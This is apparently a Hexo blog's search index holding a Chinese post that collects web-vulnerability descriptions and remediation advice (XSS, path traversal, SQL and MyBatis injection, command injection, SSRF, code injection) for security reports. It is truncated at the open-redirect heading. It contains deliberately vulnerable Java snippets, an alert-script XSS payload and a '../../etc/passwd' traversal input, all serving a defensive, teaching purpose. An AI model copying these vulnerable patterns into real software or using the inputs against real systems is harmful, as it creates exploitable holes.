<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>修复建议汇总</title>
    <link href="/2024/09/12/%E4%BF%AE%E5%A4%8D%E5%BB%BA%E8%AE%AE%E6%B1%87%E6%80%BB/"/>
    <url>/2024/09/12/%E4%BF%AE%E5%A4%8D%E5%BB%BA%E8%AE%AE%E6%B1%87%E6%80%BB/</url>
    
    <content type="html"><![CDATA[<h1 id="Web漏洞"><a href="#Web漏洞" class="headerlink" title="Web漏洞"></a>Web漏洞</h1><p>主要是为了写报告的时候复制粘贴方便……</p><h2 id="反射型XSS"><a href="#反射型XSS" class="headerlink" title="反射型XSS"></a>反射型XSS</h2><p><strong>问题描述：</strong><br>反射跨站脚本（XSS）是网络应用程序中常见的一种安全漏洞。当攻击者将恶意脚本注入网络应用程序，然后反射给用户时，就会发生这种情况。当应用程序在输出 HTML 内容中包含用户输入而未对其进行适当的消毒或验证时，就会发生这种情况。<br>攻击者可利用反射 XSS 漏洞在受害者浏览器的上下文中执行恶意脚本，从而可能导致各种安全风险，如窃取 cookie、会话劫持、网页篡改或网络钓鱼攻击。<br>例如如下代码将用户输入直接拼接到网页中返回给用户：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.io.PrintWriter;<br><span class="hljs-keyword">import</span> javax.servlet.ServletException;<br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServlet;<br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServletRequest;<br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServletResponse;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">VulnerableServlet</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">HttpServlet</span> &#123;<br>    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doGet</span><span class="hljs-params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="hljs-keyword">throws</span> ServletException, IOException &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">userInput</span> <span class="hljs-operator">=</span> request.getParameter(<span class="hljs-string">&quot;input&quot;</span>); <span class="hljs-comment">// Vulnerable to XSS</span><br><br>        response.setContentType(<span class="hljs-string">&quot;text/html&quot;</span>);<br>        <span class="hljs-type">PrintWriter</span> <span class="hljs-variable">out</span> <span class="hljs-operator">=</span> response.getWriter();<br>        out.println(<span class="hljs-string">&quot;&lt;html&gt;&quot;</span>);<br>        out.println(<span class="hljs-string">&quot;&lt;head&gt;&lt;title&gt;Reflection XSS Vulnerability Example&lt;/title&gt;&lt;/head&gt;&quot;</span>);<br>        out.println(<span class="hljs-string">&quot;&lt;body&gt;&quot;</span>);<br>        out.println(<span class="hljs-string">&quot;&lt;h1&gt;Hello, &quot;</span> + userInput + <span class="hljs-string">&quot;!&lt;/h1&gt;&quot;</span>); <span class="hljs-comment">// Vulnerable to XSS</span><br>        out.println(<span class="hljs-string">&quot;&lt;/body&gt;&quot;</span>);<br>        out.println(<span class="hljs-string">&quot;&lt;/html&gt;&quot;</span>);<br>        out.close();<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p><strong>修复建议：</strong></p><ol><li>输入验证和消毒：在向用户显示所有用户输入之前对其进行验证和消毒。这包括确保输入不包含任何 HTML、JavaScript 或其他可执行代码。</li><li>输出编码：在 HTML 中显示用户输入时对其进行编码，防止浏览器将其解释为可执行代码。使用编程语言或网络框架提供的编码库或框架。</li><li>内容安全策略（CSP）：实施严格的内容安全策略，控制哪些资源（如脚本、样式表、字体）可被网络应用程序加载。通过限制可执行脚本的来源，这有助于减轻 XSS 攻击的影响。</li><li>使用框架和库：利用可提供内置 XSS 漏洞防护的成熟框架和库。这些工具通常包括自动输入验证和输出编码功能。</li></ol><p>例如如下例子，我们使用 Apache Commons Text 库中的 StringEscapeUtils.escapeHtml4() 方法对用户输入进行 HTML 编码，然后再显示给用户。这样可以确保任何潜在的恶意脚本标记或 HTML 内容都会被转义，并以纯文本形式呈现，从而防止 XSS 攻击。：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> org.apache.commons.text.StringEscapeUtils; <span class="hljs-comment">// Using Apache Commons Text library for HTML escaping</span><br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">XSSExample</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-comment">// Simulated user input (potentially malicious)</span><br>        <span class="hljs-type">String</span> <span class="hljs-variable">userInput</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&lt;script&gt;alert(&#x27;XSS Attack!&#x27;);&lt;/script&gt;&quot;</span>;<br><br>        <span class="hljs-comment">// Encode user input to prevent XSS</span><br>        <span class="hljs-type">String</span> <span class="hljs-variable">safeOutput</span> <span class="hljs-operator">=</span> StringEscapeUtils.escapeHtml4(userInput);<br><br>        <span class="hljs-comment">// Displaying the safe output</span><br>        System.out.println(<span class="hljs-string">&quot;Safe Output: &quot;</span> + safeOutput);<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><h2 id="存储型XSS"><a href="#存储型XSS" class="headerlink" title="存储型XSS"></a>存储型XSS</h2><p><strong>问题描述：</strong></p><p><strong>修复建议：</strong></p><h2 id="DOM型XSS"><a href="#DOM型XSS" class="headerlink" title="DOM型XSS"></a>DOM型XSS</h2><p><strong>问题描述：</strong><br>DOM型XSS（跨站脚本攻击）是一种通过客户端脚本（通常是JavaScript）在用户的浏览器中执行恶意代码的攻击方式。在DOM型XSS中，攻击者利用网页中的脚本对DOM（文档对象模型）进行操作，以插入恶意脚本。与其他类型的XSS不同，DOM型XSS不需要服务器处理恶意数据；恶意脚本是在浏览器端执行的，通常是因为页面脚本不正确地处理用户输入导致的。这种攻击能够盗取用户的会话、修改网页内容或进行其他恶意行为。<br><strong>修复建议：</strong></p><ol><li>对用户输入进行适当的验证和编码：确保所有用户输入在插入DOM之前都经过适当的清理和转义。避免将不可信的输入直接用于DOM操作。</li><li>使用安全的API：尽量使用不会解析HTML的安全API，如textContent而不是innerHTML，以及使用Element.setAttribute来设置属性值，而不是直接操作属性。</li><li>内容安全策略（CSP）：实施合适的内容安全策略，特别是限制执行内联JavaScript和未经授权的外部脚本。</li><li>利用框架的防护功能：使用现代Web框架（如React, Angular, Vue等）提供的XSS防护机制。这些框架通常会自动处理许多潜在的XSS攻击。</li></ol><h2 id="目录遍历"><a href="#目录遍历" class="headerlink" title="目录遍历"></a>目录遍历</h2><p><strong>问题描述：</strong><br>目录遍历（又称路径遍历）是一种安全漏洞，攻击者利用这种漏洞可以访问存储在服务器文件系统中，应用程序目标目录之外的文件和目录。通过构造包含如“..&#x2F;”（向上导航）的输入，攻击者可以操控应用程序来访问本不应该被访问的文件系统路径。这可能导致敏感信息泄露，例如配置文件、密码文件等，或者允许攻击者修改系统文件或执行恶意代码，对系统安全构成严重威胁。<br>例如下列代码，filePath变量由外部传入，如传入”..&#x2F;..&#x2F;etc&#x2F;passwd”类似字段，那么可能访问到不应该被访问的系统文件：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">DirectoryTraversalVulnerable</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-type">byte</span>[] readFile(String filePath) <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">File</span> <span class="hljs-variable">file</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(filePath);<br>        <span class="hljs-type">FileInputStream</span> <span class="hljs-variable">fis</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(file);<br>        <span class="hljs-type">byte</span>[] data = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[(<span class="hljs-type">int</span>) file.length()];<br>        fis.read(data);<br>        fis.close();<br>        <span class="hljs-keyword">return</span> data;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>修复建议：</strong></p><ol><li>输入验证：对所有输入路径进行严格验证。拒绝或移除输入中的任何尝试访问当前目录之外资源的尝试，如使用正则表达式过滤掉“..&#x2F;”等序列。</li><li>使用安全的API：使用文件访问相关的安全API，确保API逻辑中已经考虑并处理了目录遍历的风险。</li><li>使用白名单：创建并维护一个允许访问的文件路径白名单，确保只有白名单上的文件才能被访问。</li><li>权限最小化：限制应用程序的文件系统访问权限，仅允许访问必要的文件和目录，减少安全漏洞带来的潜在风险。</li><li>错误处理：正确处理文件访问错误，避免通过错误信息泄露服务器文件结构或敏感信息。</li></ol><p>例如如下代码，使用basePath定义了一个安全的基础目录，所有的文件访问都限定在这个目录或其子目录内。使用File.getCanonicalPath()方法可以解析出绝对路径，并检查该路径是否以指定的安全基路径开始。如果尝试访问其他目录，系统会抛出安全异常，从而防止了目录遍历攻击。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">DirectoryTraversalSafe</span> &#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">basePath</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;/var/data/appfiles&quot;</span>;  <span class="hljs-comment">// 安全基路径</span><br><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">byte</span>[] readFile(String filePath) <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">File</span> <span class="hljs-variable">file</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(basePath, filePath);<br>        <span class="hljs-keyword">if</span> (!file.getCanonicalPath().startsWith(basePath)) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SecurityException</span>(<span class="hljs-string">&quot;Attempted directory traversal attack&quot;</span>);<br>        &#125;<br>        <span class="hljs-type">FileInputStream</span> <span class="hljs-variable">fis</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(file);<br>        <span class="hljs-type">byte</span>[] data = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[(<span class="hljs-type">int</span>) file.length()];<br>        fis.read(data);<br>        fis.close();<br>        <span class="hljs-keyword">return</span> data;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h2><p><strong>问题描述：</strong><br>SQL注入是一种安全漏洞，攻击者通过在SQL查询中注入恶意的SQL代码，从而能够操控数据库。这种攻击可以让攻击者绕过身份验证、窃取、修改或删除数据。SQL注入通常发生在应用程序使用用户输入来构造SQL查询时，如果没有适当的输入处理或参数化查询，就会允许攻击者注入恶意的SQL代码。这种漏洞可能导致数据泄露、数据丢失和其他严重的后果。<br>例如如下代码直接将用户输入拼接到SQL语句中：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SqlInjectionVulnerable</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">getUser</span><span class="hljs-params">(String username)</span> &#123;<br>        <span class="hljs-type">Connection</span> <span class="hljs-variable">conn</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>        <span class="hljs-type">Statement</span> <span class="hljs-variable">stmt</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>        <span class="hljs-keyword">try</span> &#123;<br>            conn = DriverManager.getConnection(<span class="hljs-string">&quot;jdbc:mysql://localhost/testdb&quot;</span>, <span class="hljs-string">&quot;user&quot;</span>, <span class="hljs-string">&quot;password&quot;</span>);<br>            stmt = conn.createStatement();<br>            <span class="hljs-type">ResultSet</span> <span class="hljs-variable">rs</span> <span class="hljs-operator">=</span> stmt.executeQuery(<span class="hljs-string">&quot;SELECT * FROM users WHERE username = &#x27;&quot;</span> + username + <span class="hljs-string">&quot;&#x27;&quot;</span>);<br>            <span class="hljs-keyword">while</span> (rs.next()) &#123;<br>                <span class="hljs-comment">// 处理结果</span><br>            &#125;<br>        &#125; <span class="hljs-keyword">catch</span> (SQLException e) &#123;<br>            e.printStackTrace();<br>        &#125; <span class="hljs-keyword">finally</span> &#123;<br>            <span class="hljs-keyword">try</span> &#123; <span class="hljs-keyword">if</span> (stmt != <span class="hljs-literal">null</span>) stmt.close(); &#125; <span class="hljs-keyword">catch</span> (SQLException e) &#123; &#125;<br>            <span class="hljs-keyword">try</span> &#123; <span class="hljs-keyword">if</span> (conn != <span class="hljs-literal">null</span>) conn.close(); &#125; <span class="hljs-keyword">catch</span> (SQLException e) &#123; &#125;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>修复建议：</strong></p><ol><li>参数化查询：使用参数化查询是防止SQL注入的最有效手段。参数化查询确保了SQL语句的结构不会因传入的数据而改变。</li><li>使用预编译语句：预编译语句（例如在Java中的PreparedStatement）与参数化查询类似，可以有效防止SQL注入，因为它们将SQL语句的结构与数据分开处理。</li><li>输入验证：对所有用户输入进行验证，拒绝任何可疑的输入。虽然这不能单独防止SQL注入，但可以减少易受攻击的攻击面。</li><li>使用ORM框架：对象关系映射（ORM）框架如Hibernate或JPA通常会使用参数化查询和其他安全措施，这可以帮助减少直接SQL注入的风险。</li><li>最小权限原则：确保数据库账户仅具有执行必要操作的权限，这可以减少在SQL注入攻击成功时可被攻击者利用的数据。</li></ol><p>例如如下代码使用PreparedStatement和设置参数，有效地防止了SQL注入的可能性：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SqlInjectionSafe</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">getUser</span><span class="hljs-params">(String username)</span> &#123;<br>        <span class="hljs-type">Connection</span> <span class="hljs-variable">conn</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>        <span class="hljs-type">PreparedStatement</span> <span class="hljs-variable">pstmt</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>        <span class="hljs-keyword">try</span> &#123;<br>            conn = DriverManager.getConnection(<span class="hljs-string">&quot;jdbc:mysql://localhost/testdb&quot;</span>, <span class="hljs-string">&quot;user&quot;</span>, <span class="hljs-string">&quot;password&quot;</span>);<br>            pstmt = conn.prepareStatement(<span class="hljs-string">&quot;SELECT * FROM users WHERE username = ?&quot;</span>);<br>            pstmt.setString(<span class="hljs-number">1</span>, username);<br>            <span class="hljs-type">ResultSet</span> <span class="hljs-variable">rs</span> <span class="hljs-operator">=</span> pstmt.executeQuery();<br>            <span class="hljs-keyword">while</span> (rs.next()) &#123;<br>                <span class="hljs-comment">// 处理结果</span><br>            &#125;<br>        &#125; <span class="hljs-keyword">catch</span> (SQLException e) &#123;<br>            e.printStackTrace();<br>        &#125; <span class="hljs-keyword">finally</span> &#123;<br>            <span class="hljs-keyword">try</span> &#123; <span class="hljs-keyword">if</span> (pstmt != <span class="hljs-literal">null</span>) pstmt.close(); &#125; <span class="hljs-keyword">catch</span> (SQLException e) &#123; &#125;<br>            <span class="hljs-keyword">try</span> &#123; <span class="hljs-keyword">if</span> (conn != <span class="hljs-literal">null</span>) conn.close(); &#125; <span class="hljs-keyword">catch</span> (SQLException e) &#123; &#125;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="SQL注入（Mybatis）"><a href="#SQL注入（Mybatis）" class="headerlink" title="SQL注入（Mybatis）"></a>SQL注入（Mybatis）</h2><p><strong>问题描述：</strong><br>在Mybatis中，使用${}符号来进行变量的替换是一种常见做法。这种替换会直接将变量的值嵌入到SQL语句中，而不会像#{}那样进行预处理和参数绑定。虽然${}的使用可以提供灵活的动态SQL支持，但它也带来了显著的安全隐患，尤其是在处理不可信的用户输入时。如果直接将用户输入通过${}嵌入到SQL语句中，攻击者可以通过构造特殊的输入值来改变SQL语句的结构，执行非法的数据库操作，从而导致SQL注入漏洞。这种漏洞使得攻击者可能读取未授权的数据、篡改数据甚至完全破坏数据库，对系统安全造成严重威胁。<br>例如如下的配置文件中使用了${}来拼接sql语句：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">mapper</span> <span class="hljs-attr">namespace</span>=<span class="hljs-string">&quot;com.example.mapper.UserMapper&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">select</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;findUserByUsername&quot;</span> <span class="hljs-attr">resultType</span>=<span class="hljs-string">&quot;com.example.model.User&quot;</span>&gt;</span><br>        SELECT * FROM users WHERE username = &#x27;$&#123;username&#125;&#x27;<br>    <span class="hljs-tag">&lt;/<span class="hljs-name">select</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">mapper</span>&gt;</span><br></code></pre></td></tr></table></figure><p><strong>修复建议：</strong></p><ol><li>避免使用${}处理用户输入：对于所有的用户输入，避免直接通过${}进行SQL语句中的变量替换。使用${}时，应仅限于那些不由外部用户控制的、内部可信的变量。</li><li>使用#{}进行参数绑定：对于需要动态插入到SQL语句中的数据，应使用Mybatis的#{}占位符。这种方式会通过预编译的SQL语句和参数绑定来处理变量，有效预防SQL注入攻击。</li><li>输入验证和清理：在将用户输入用于数据库查询之前，应对其进行严格的验证和清理。确保输入值符合预期的格式，并限制其长度和范围，以减少被恶意利用的可能性。</li><li>使用Mybatis动态SQL能力：当需要构建复杂的动态SQL时，利用Mybatis提供的动态SQL功能，如<choose>, <if>, <when>, <otherwise>等标签，而不是手动拼接SQL字符串。</li></ol><p>如下代码中使用了#{}进行参数接受，防止sql注入的产生：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">mapper</span> <span class="hljs-attr">namespace</span>=<span class="hljs-string">&quot;com.example.mapper.UserMapper&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">select</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;findUserByUsername&quot;</span> <span class="hljs-attr">parameterType</span>=<span class="hljs-string">&quot;string&quot;</span> <span class="hljs-attr">resultType</span>=<span class="hljs-string">&quot;com.example.model.User&quot;</span>&gt;</span><br>        SELECT * FROM users WHERE username = #&#123;username&#125;<br>    <span class="hljs-tag">&lt;/<span class="hljs-name">select</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">mapper</span>&gt;</span><br></code></pre></td></tr></table></figure><h2 id="命令注入"><a href="#命令注入" class="headerlink" title="命令注入"></a>命令注入</h2><p><strong>问题描述</strong>：<br>命令注入是一种安全漏洞，发生在应用程序将不可信的用户输入作为系统命令的一部分执行时。攻击者通过在输入中嵌入恶意命令或参数，利用这种漏洞来执行任意系统命令，这可能导致数据泄露、系统被控制、以及其他安全风险。这种漏洞通常出现在应用程序没有正确清理或验证用户输入时，尤其是在使用如Runtime.exec()、ProcessBuilder等在Java中执行系统命令的API时。<br><strong>修复建议：</strong></p><ol><li>避免直接执行用户输入：尽可能不要直接将用户输入用于系统命令。如果必须这样做，确保对输入进行严格的验证和清理。</li><li>使用安全的API替代直接命令执行：使用参数化或安全的API，如Java中的ProcessBuilder，并且将命令和参数严格分离。</li><li>白名单验证：创建一个允许的命令和参数的白名单，只有经过验证的命令和参数才能被执行。</li><li>最小权限原则：运行应用程序的系统用户应具有最小的必要权限，防止恶意命令对系统造成重大影响。</li><li>使用安全库和工具：考虑使用现有的安全库或工具来处理用户输入，减少自行实现清理和验证的风险。</li></ol><h2 id="服务器请求伪造SSRF"><a href="#服务器请求伪造SSRF" class="headerlink" title="服务器请求伪造SSRF"></a>服务器请求伪造SSRF</h2><p><strong>问题描述：</strong><br>服务器请求伪造（Server-Side Request Forgery，SSRF）是一种网络攻击，其中攻击者能够迫使服务器端应用程序对攻击者指定的内部或外部网络发起请求。这种攻击通常是通过利用应用程序中的一个功能，该功能通过用户提供的URL从服务器上下载数据或与之交互。如果应用程序未能适当验证用户提供的URL，攻击者就可能利用这个功能来访问通常无法从外部访问的服务，如位于防火墙后面的内部服务，或者利用服务器与其他服务的信任关系来发起攻击，从而绕过IP白名单、进行端口扫描等。<br><strong>修复建议：</strong></p><ol><li>验证和过滤输入：确保所有用户提供的URL都经过严格的验证和过滤，以确保它们符合预期的格式，并且指向合法的目标地址。可以使用允许列表来限制可访问的协议和域名。</li><li>限制请求目标：应用程序应限制可通过服务器发起请求的目标地址和端口，避免访问敏感或私有网络资源。</li><li>使用安全库处理URL：使用安全的库来处理和解析URL，而不是自己构建请求逻辑，以避免引入安全漏洞。</li><li>实施适当的超时和重试策略：为所有出站请求实施适当的超时和重试策略，以避免服务拒绝（DoS）攻击。</li><li>使用代理服务器：通过代理服务器转发所有出站请求，可以提供额外的过滤和审计功能，同时隐藏服务器的真实IP地址。</li></ol><p>如下列代码使用isValidUrl方法来验证输入的URL是否合法，确保只有预期的、受信任的地址和协议被允许，从而避免了SSRF漏洞：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.io.BufferedReader;<br><span class="hljs-keyword">import</span> java.io.InputStreamReader;<br><span class="hljs-keyword">import</span> java.net.HttpURLConnection;<br><span class="hljs-keyword">import</span> java.net.URL;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SsrfSafeExample</span> &#123;<br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">fetchUrlContent</span><span class="hljs-params">(String urlString)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">URL</span> <span class="hljs-variable">url</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">URL</span>(urlString);<br><br>        <span class="hljs-comment">// 验证URL是否符合预期的目标地址和协议</span><br>        <span class="hljs-keyword">if</span> (!isValidUrl(url)) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">IllegalArgumentException</span>(<span class="hljs-string">&quot;Invalid URL provided&quot;</span>);<br>        &#125;<br><br>        <span class="hljs-type">HttpURLConnection</span> <span class="hljs-variable">connection</span> <span class="hljs-operator">=</span> (HttpURLConnection) url.openConnection();<br>        <span class="hljs-type">BufferedReader</span> <span class="hljs-variable">reader</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BufferedReader</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">InputStreamReader</span>(connection.getInputStream()));<br>        <br>        <span class="hljs-type">StringBuilder</span> <span class="hljs-variable">response</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">StringBuilder</span>();<br>        String line;<br>        <span class="hljs-keyword">while</span> ((line = reader.readLine()) != <span class="hljs-literal">null</span>) &#123;<br>            response.append(line);<br>        &#125;<br>        reader.close();<br>        <br>        <span class="hljs-keyword">return</span> response.toString();<br>    &#125;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">isValidUrl</span><span class="hljs-params">(URL url)</span> &#123;<br>        <span class="hljs-comment">// 实现URL验证逻辑，例如检查主机名和协议是否在允许列表中</span><br>        <span class="hljs-comment">// 示例仅供说明，具体逻辑根据应用需求定制</span><br>        <span class="hljs-type">String</span> <span class="hljs-variable">host</span> <span class="hljs-operator">=</span> url.getHost();<br>        <span class="hljs-type">String</span> <span class="hljs-variable">protocol</span> <span class="hljs-operator">=</span> url.getProtocol();<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;http&quot;</span>.equals(protocol) &amp;&amp; (<span class="hljs-string">&quot;example.com&quot;</span>.equals(host) || <span class="hljs-string">&quot;api.example.com&quot;</span>.equals(host));<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><h2 id="代码注入"><a href="#代码注入" class="headerlink" title="代码注入"></a>代码注入</h2><p><strong>问题描述：</strong><br>代码注入是指攻击者通过未验证或不安全的输入，直接将恶意代码注入应用程序并执行的漏洞。这种攻击通常发生在应用程序将用户提供的数据直接传递给解释器或执行器（如<code>eval()</code>、<code>Runtime.exec()</code>等），导致攻击者能够执行任意代码或命令。代码注入的影响包括篡改数据、泄露敏感信息、甚至完全控制系统。</p><p><strong>修复建议：</strong></p><ol><li><strong>避免使用动态代码执行</strong>：尽可能避免使用像<code>eval()</code>、<code>Runtime.exec()</code>或其他类似的动态代码执行方法。如果必须使用，确保对输入进行严格的验证和清理。</li><li><strong>输入验证和清理</strong>：对所有用户输入进行严格的验证和清理，确保输入数据符合预期的格式，并拒绝或移除危险的字符或表达式。</li><li><strong>使用参数化输入</strong>：在构建命令或脚本时，使用参数化方法，避免将用户输入直接拼接到代码或命令中。</li><li><strong>最小权限原则</strong>：确保执行代码的环境和用户账户有最小的权限，防止恶意代码执行造成更大的影响。</li><li><strong>安全开发框架</strong>：使用安全的开发框架，这些框架通常会提供防御代码注入的功能和机制，如Spring、Struts等。</li></ol><h2 id="开放重定向"><a href="#开放重定向" class="headerlink" 